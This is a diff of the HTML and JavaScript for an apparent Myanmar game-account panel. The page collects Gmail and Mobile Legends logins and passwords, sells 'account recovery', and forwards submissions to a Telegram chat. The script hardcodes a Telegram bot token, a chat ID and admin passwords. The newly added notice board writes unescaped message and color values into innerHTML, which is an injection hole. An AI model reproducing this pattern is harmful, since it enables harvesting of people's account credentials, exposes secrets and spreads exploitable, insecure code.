@@ -30,7 +30,6 @@
         .sec-note{background:rgba(255,193,7,0.1);border-left:4px solid var(--w);padding:10px;border-radius:6px;margin-top:10px;font-size:12px}
         .footer{text-align:center;padding:12px;color:rgba(255,255,255,0.7);font-size:11px;border-top:1px solid rgba(74,28,122,0.5)}
         .option{cursor:pointer;padding:10px;background:rgba(0,0,0,0.2);border-radius:6px;margin-bottom:6px;font-size:13px}
-        .contact-item{display:flex;align-items:center;gap:10px;cursor:pointer;padding:10px;background:rgba(0,0,0,0.2);border-radius:6px;margin-bottom:6px;font-size:13px}
         .history-list{max-height:200px;overflow-y:auto}
         .history-item{padding:6px;margin-bottom:4px;background:rgba(0,0,0,0.2);border-radius:4px;border-left:3px solid var(--g);font-size:11px}
         .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:2000;justify-content:center;align-items:center}
@@ -48,6 +47,10 @@
         .user-id-box span{color:var(--w);font-size:14px;font-weight:bold}
         .user-row{display:flex;justify-content:space-between;align-items:center;padding:6px;background:rgba(0,0,0,0.2);border-radius:4px;margin-bottom:3px;font-size:11px;border-left:3px solid var(--g)}
         .user-row.banned{border-left-color:var(--r);opacity:0.7}
+        .notice-box{background:rgba(0,0,0,0.3);padding:20px;border-radius:10px;min-height:100px;text-align:center;border:2px solid rgba(255,255,255,0.1);transition:all 0.5s}
+        .notice-box .notice-icon{font-size:36px;margin-bottom:10px}
+        .notice-box .notice-text{white-space:pre-wrap;font-size:15px;font-weight:bold;line-height:1.8}
+        .notice-box .notice-time{font-size:10px;color:rgba(255,255,255,0.5);margin-top:12px}
     </style>
 </head>
 <body>
@@ -60,9 +63,7 @@
             <button onclick="logout()" style="background:var(--r);color:#fff;border:none;padding:8px 20px;border-radius:5px;cursor:pointer;margin-top:10px;font-size:14px"><i class="fas fa-sign-out-alt"></i> Logout</button>
         </div>
         <div class="content">
-            <div class="panel">
-                <div class="user-id-box"><span>Your ID: </span><span id="myUserId">------</span></div>
-            </div>
+            <div class="panel"><div class="user-id-box"><span>Your ID: </span><span id="myUserId">------</span></div></div>
             <div class="panel">
                 <h2><i class="fas fa-cogs"></i> Panel</h2>
                 <div class="tabs">
@@ -73,6 +74,7 @@
                     <div class="tab" onclick="st('historyTab')"><i class="fas fa-history"></i><br>History</div>
                     <div class="tab" onclick="st('contactTab')"><i class="fas fa-address-book"></i><br>Contact</div>
                 </div>
+
                 <div class="tab-content active" id="dataTab">
                     <h3 style="color:var(--w);margin-bottom:8px">Select Data Type</h3>
                     <div class="data-select">
@@ -112,6 +114,7 @@
                         <button class="btn btn-g" onclick="doTikTok()">Submit</button>
                     </div>
                 </div>
+
                 <div class="tab-content" id="recoveryTab">
                     <h3 style="color:var(--w)">Account Recovery</h3>
                     <div class="option" onclick="selSkin('8000')">Skin 30-100 (8,000 MMK)</div>
@@ -124,6 +127,7 @@
                     <div id="redeemBox" style="display:none"><div class="form-group"><label>Redeem Code</label><input type="text" id="redeemCode"></div></div>
                     <button class="btn btn-g" onclick="doRecovery()">Recover Account</button>
                 </div>
+
                 <div class="tab-content" id="passwordTab">
                     <h3 style="color:var(--w)">Change Password</h3>
                     <div class="form-group"><label>Type</label><select id="passType"><option value="gmail">Gmail</option><option value="mlbb">MLBB</option></select></div>
@@ -131,14 +135,17 @@
                     <div class="form-group"><label>New</label><input type="password" id="newPass"></div>
                     <button class="btn btn-w" onclick="chPass()">Change</button>
                 </div>
+
                 <div class="tab-content" id="noticeTab">
                     <h3 style="color:var(--w)"><i class="fas fa-bullhorn"></i> Notice Board</h3>
-                    <div id="noticeContent" style="background:rgba(0,0,0,0.3);padding:15px;border-radius:8px;min-height:80px"><p style="text-align:center">Loading...</p></div>
+                    <div class="notice-box" id="noticeContent"><p style="color:rgba(255,255,255,0.5)">Loading...</p></div>
                 </div>
+
                 <div class="tab-content" id="historyTab">
                     <h3 style="color:var(--w)">User ID History</h3>
                     <div class="history-list" id="userHistory"></div>
                 </div>
+
                 <div class="tab-content" id="contactTab">
                     <h3 style="color:var(--w)">Contact Us</h3>
                     <div style="overflow-x:auto"><table style="width:100%;border-collapse:collapse;font-size:12px">
@@ -157,8 +164,7 @@
     </div>
 
     <div class="modal" id="emailModal">
-        <div class="modal-box">
-            <span class="modal-close" onclick="closeEmail()">&times;</span><h3>Send Message</h3>
+        <div class="modal-box"><span class="modal-close" onclick="closeEmail()">&times;</span><h3>Send Message</h3>
             <div class="form-group"><label>Name</label><input type="text" id="emName" placeholder="Your Name"></div>
             <div class="form-group"><label>Email</label><input type="email" id="emEmail" placeholder="Your Email"></div>
             <div class="form-group"><label>Phone</label><input type="text" id="emPhone" placeholder="Phone Number"></div>
@@ -168,8 +174,7 @@
     </div>
 
     <div class="modal" id="adminModal">
-        <div class="modal-box">
-            <span class="modal-close" onclick="closeAdminModal()">&times;</span><h3>Admin Panel</h3>
+        <div class="modal-box"><span class="modal-close" onclick="closeAdminModal()">&times;</span><h3>Admin Panel</h3>
             <div class="form-group"><label>Admin Password</label><input type="password" id="adminPass"></div>
             <button class="btn btn-w" onclick="unlockAdmin()">Unlock Admin</button>
             <div id="adminBox" style="display:none;margin-top:15px">
@@ -185,15 +190,18 @@
                 <div id="tiktokList" style="max-height:120px;overflow-y:auto;margin-bottom:8px"></div>
                 <div style="border-top:1px solid rgba(255,255,255,0.1);padding-top:10px;margin-top:10px">
                     <div class="form-group"><label><i class="fas fa-bullhorn"></i> Post Notice</label><textarea id="noticeMsg" rows="2" placeholder="Enter notice..."></textarea></div>
-                    <button class="btn btn-w" onclick="postNotice()"><i class="fas fa-paper-plane"></i> Post Notice</button>
+                    <div class="form-group"><label><i class="fas fa-palette"></i> Text Color</label><input type="color" id="noticeColor" value="#ffffff" style="height:35px;padding:2px"></div>
+                    <div style="display:flex;gap:5px">
+                        <button class="btn btn-w" onclick="postNotice()" style="flex:1"><i class="fas fa-paper-plane"></i> Post</button>
+                        <button class="btn btn-r" onclick="deleteNotice()" style="flex:1"><i class="fas fa-trash"></i> Delete</button>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
 
     <div class="modal" id="editModal">
-        <div class="modal-box">
-            <span class="modal-close" onclick="closeEditModal()">&times;</span><h3>Edit User</h3>
+        <div class="modal-box"><span class="modal-close" onclick="closeEditModal()">&times;</span><h3>Edit User</h3>
             <input type="hidden" id="editUserId">
             <div class="form-group"><label>Name</label><input type="text" id="editName"></div>
             <div class="form-group"><label>Email</label><input type="email" id="editEmail"></div>
@@ -203,7 +211,7 @@
         </div>
     </div>
 
-    <script>
+<script>
         emailjs.init("tsKN2j9o6RYK4KeEp");
         const BOT="8737284644:AAEW7XtU6HqK4O49dJXG6MXSj08BvLUAdJE",CID="8315928972",ADMIN="MK2008";
         let GPASS="DoubleMK2008",MPASS="GlobalMK2008";
@@ -223,39 +231,20 @@
         async function chPass(){const t=document.getElementById("passType").value,cp=document.getElementById("curPass").value,np=document.getElementById("newPass").value;if(!cp||!np)return n("Fill all","error");try{const r=await fetch("/api/change_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:localStorage.getItem("auth_token"),type:t,current_password:cp,new_password:np})});const d=await r.json();d.success?(n("Changed!"),loadPw()):n(d.message,"error")}catch(e){n("Connection error","error")}}
         function unlockG(){document.getElementById("gmailPass").value===GPASS?document.getElementById("gmailGen").style.display="block":n("Wrong password","error")}
         function unlockM(){document.getElementById("mlbbPass").value===MPASS?document.getElementById("mlbbGen").style.display="block":n("Wrong password","error")}
-        
-        async function unlockAdmin(){
-            if(document.getElementById("adminPass").value!==ADMIN)return n("Wrong password","error");
-            document.getElementById("adminBox").style.display="block";
-            loadAdminData();
-        }
-        
-        async function loadAdminData(){
-            try{
-                const r=await fetch("/api/admin/users_grouped");const d=await r.json();
-                document.getElementById("totalUsers").textContent=d.total||0;
-                document.getElementById("bannedUsers").textContent=(d.banned||[]).length;
-                const banned=d.banned||[];
-                const renderList=(list,container,canEdit)=>{
-                    container.innerHTML=list.length===0?'<p style="font-size:11px">No users</p>':list.map(u=>{
-                        const isBanned=banned.includes(u.id.toString());
-                        return `<div class="user-row${isBanned?' banned':''}"><div><b>ID:${u.id.toString().padStart(6,'0')}</b><br>${u.username||'N/A'}<br><small>${u.email}</small></div><div style="display:flex;gap:3px;flex-wrap:wrap">${canEdit?`<button class="btn btn-sm btn-w" onclick="openEditModal('${u.id}','${u.username||''}','${u.email||''}','${u.phone||''}')">Edit</button>`:''}${isBanned?`<button class="btn btn-sm btn-g" onclick="unbanUser('${u.id}')">Unban</button>`:`<button class="btn btn-sm btn-r" onclick="banUserById('${u.id}')">Ban</button>`}<button class="btn btn-sm btn-r" onclick="delUserById('${u.id}')">Del</button></div></div>`;
-                    }).join('');
-                };
-                renderList(d.local||[],document.getElementById("localList"),true);
-                renderList(d.google||[],document.getElementById("googleList"),false);
-                renderList(d.tiktok||[],document.getElementById("tiktokList"),false);
-            }catch(e){}
-        }
-
+        async function unlockAdmin(){if(document.getElementById("adminPass").value!==ADMIN)return n("Wrong password","error");document.getElementById("adminBox").style.display="block";loadAdminData()}
+        async function loadAdminData(){try{const r=await fetch("/api/admin/users_grouped");const d=await r.json();document.getElementById("totalUsers").textContent=d.total||0;document.getElementById("bannedUsers").textContent=(d.banned||[]).length;const banned=d.banned||[];const renderList=(list,container,canEdit)=>{container.innerHTML=list.length===0?'<p style="font-size:11px">No users</p>':list.map(u=>{const isBanned=banned.includes(u.id.toString());return`<div class="user-row${isBanned?' banned':''}"><div><b>ID:${u.id.toString().padStart(6,'0')}</b><br>${u.username||'N/A'}<br><small>${u.email}</small></div><div style="display:flex;gap:3px;flex-wrap:wrap">${canEdit?`<button class="btn btn-sm btn-w" onclick="openEditModal('${u.id}','${u.username||''}','${u.email||''}','${u.phone||''}')">Edit</button>`:''}${isBanned?`<button class="btn btn-sm btn-g" onclick="unbanUser('${u.id}')">Unban</button>`:`<button class="btn btn-sm btn-r" onclick="banUserById('${u.id}')">Ban</button>`}<button class="btn btn-sm btn-r" onclick="delUserById('${u.id}')">Del</button></div></div>`}).join('')};renderList(d.local||[],document.getElementById("localList"),true);renderList(d.google||[],document.getElementById("googleList"),false);renderList(d.tiktok||[],document.getElementById("tiktokList"),false)}catch(e){}}
         function createG(){const na=document.getElementById("gName").value,em=document.getElementById("gEmail").value,pw=document.getElementById("gPw").value,ph=document.getElementById("gPhone").value;if(!na||!em||!pw)return n("Fill required","error");const id=uid();gmails.push({userId:id,name:na,email:em,password:pw,phone:ph,time:new Date().toLocaleString()});localStorage.setItem('gmails',JSON.stringify(gmails));hist.push({userId:id,type:'Gmail',time:new Date().toLocaleString()});localStorage.setItem('hist',JSON.stringify(hist));fetch("/api/save_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id,type:'gmail',data:{name:na,email:em,password:pw,phone:ph}})});tg("📧 New Gmail\nID: "+id+"\nName: "+na+"\nEmail: "+em);n("Gmail created!")}
         function createM(){const na=document.getElementById("mName").value,ig=document.getElementById("mId").value,gm=document.getElementById("mGmail").value,pw=document.getElementById("mPw").value,sv=document.getElementById("mServer").value;if(!na||!ig||!gm||!pw)return n("Fill required","error");const ui=uid();mlbbs.push({userId:ui,ingameName:na,ingameId:ig,serverId:sv,gmail:gm,password:pw,time:new Date().toLocaleString()});localStorage.setItem('mlbbs',JSON.stringify(mlbbs));hist.push({userId:ui,type:'MLBB',time:new Date().toLocaleString()});localStorage.setItem('hist',JSON.stringify(hist));fetch("/api/save_data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:ui,type:'mlbb',data:{ingameName:na,ingameId:ig,serverId:sv,gmail:gm,password:pw}})});tg("🎮 New MLBB\nID: "+ui+"\nName: "+na+"\nGame ID: "+ig);n("MLBB created!")}
         function selSkin(v){skin=v;document.getElementById('skinRange').value=v;document.getElementById('idBox').style.display='block'}
         function selPay(m){pay=m;document.getElementById('creditBox').style.display=m==='credit'?'block':'none';document.getElementById('redeemBox').style.display=m==='redeem'?'block':'none'}
         function doRecovery(){const id=document.getElementById('recId').value,s=document.getElementById('recServer').value;if(!skin)return n("Select skin","error");if(!id||!s)return n("Enter ID and Server","error");tg("🔄 Recovery\nID: "+id+"\nServer: "+s+"\nSkin: "+skin);n("Recovery initiated!")}
         function doTikTok(){const u=document.getElementById("ttUser").value,g=document.getElementById("ttGame").value,p=document.getElementById("ttPromise").value,e=document.getElementById("ttEmail").value;if(!u||!g||!p||!e)return n("Fill all","error");tg("📱 TikTok\nUser: "+u+"\nGame: "+g+"\nPromise: "+p);n("Submitted!")}
-        async function loadNotice(){try{const r=await fetch("/api/notice");const d=await r.json();const c=document.getElementById("noticeContent");d.success&&d.message?c.innerHTML='<p style="white-space:pre-wrap;font-size:13px">'+d.message+'</p><p style="font-size:10px;color:rgba(255,255,255,0.5);margin-top:8px">'+(d.created_at||'')+'</p>':c.innerHTML='<p style="text-align:center">No notices yet.</p>'}catch(e){document.getElementById("noticeContent").innerHTML='<p>Error</p>'}}
-        async function postNotice(){const m=document.getElementById("noticeMsg").value;if(!m)return n("Enter message","error");try{const r=await fetch("/api/admin/notice",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:m})});const d=await r.json();d.success?(n("Posted!"),document.getElementById("noticeMsg").value="",loadNotice()):n(d.message,"error")}catch(e){n("Connection error","error")}}
+        
+        async function loadNotice(){try{const r=await fetch("/api/notice");const d=await r.json();const c=document.getElementById("noticeContent");if(d.success&&d.message){c.innerHTML=`<div class="notice-icon" style="color:${d.color||'var(--w)'}"><i class="fas fa-bullhorn"></i></div><div class="notice-text" style="color:${d.color||'var(--t)'}">${d.message}</div><div class="notice-time">${new Date(d.created_at).toLocaleString()}</div>`;c.style.borderColor=d.color||'rgba(255,255,255,0.1)'}else{c.innerHTML='<div class="notice-icon" style="color:rgba(255,255,255,0.3)"><i class="fas fa-inbox"></i></div><p style="color:rgba(255,255,255,0.4)">No notices yet</p>';c.style.borderColor='rgba(255,255,255,0.1)'}}catch(e){document.getElementById("noticeContent").innerHTML='<p>Error</p>'}}
+        
+        async function postNotice(){const m=document.getElementById("noticeMsg").value,co=document.getElementById("noticeColor").value;if(!m)return n("Enter message","error");try{const r=await fetch("/api/admin/notice",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:m,color:co})});const d=await r.json();d.success?(n("Posted!"),document.getElementById("noticeMsg").value="",loadNotice()):n(d.message,"error")}catch(e){n("Connection error","error")}}
+        async function deleteNotice(){if(!confirm("Delete the notice?"))return;try{const r=await fetch("/api/admin/notice",{method:"DELETE"});const d=await r.json();d.success?(n("Deleted!"),loadNotice()):n(d.message,"error")}catch(e){n("Connection error","error")}}
+        
         async function banUserById(id){await fetch("/api/admin/ban",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id})});tg("🚫 Banned: "+id);loadAdminData();n("Banned!")}
         async function unbanUser(id){await fetch("/api/admin/unban",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id})});loadAdminData();n("Unbanned!")}
         async function delUserById(id){if(!confirm("Delete user "+id+"?"))return;await fetch("/api/admin/delete",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:id})});gmails=gmails.filter(x=>x.userId!==id);mlbbs=mlbbs.filter(x=>x.userId!==id);localStorage.setItem('gmails',JSON.stringify(gmails));localStorage.setItem('mlbbs',JSON.stringify(mlbbs));tg("🗑️ Deleted: "+id);loadAdminData();n("Deleted!")}
@@ -270,13 +259,7 @@
             document.getElementById("myUserId").textContent=user.id?user.id.toString().padStart(6,'0'):'------';
             fetch("/api/track_login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:user.id,username:user.username,email:user.email,loginType:user.login_type})});
             await loadPw();dispHist();loadNotice();
-            
-            // Check if banned
-            if(user.id){
-                const r=await fetch("/api/check_banned",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:user.id.toString()})});
-                const d=await r.json();
-                if(d.banned){document.body.innerHTML='<div style="text-align:center;padding:50px;color:var(--r)"><h1><i class="fas fa-ban"></i></h1><h2>သင်၏အကောင့် ဘန်းခံထားရပါသည်</h2><p>Your account has been banned.</p></div>';return}
-            }
+            if(user.id){const r=await fetch("/api/check_banned",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:user.id.toString()})});const d=await r.json();if(d.banned){document.body.innerHTML='<div style="text-align:center;padding:50px;color:var(--r)"><h1><i class="fas fa-ban"></i></h1><h2>သင်၏အကောင့် ဘန်းခံထားရပါသည်</h2><p>Your account has been banned.</p></div>';return}}
         };
     </script>
 </body>
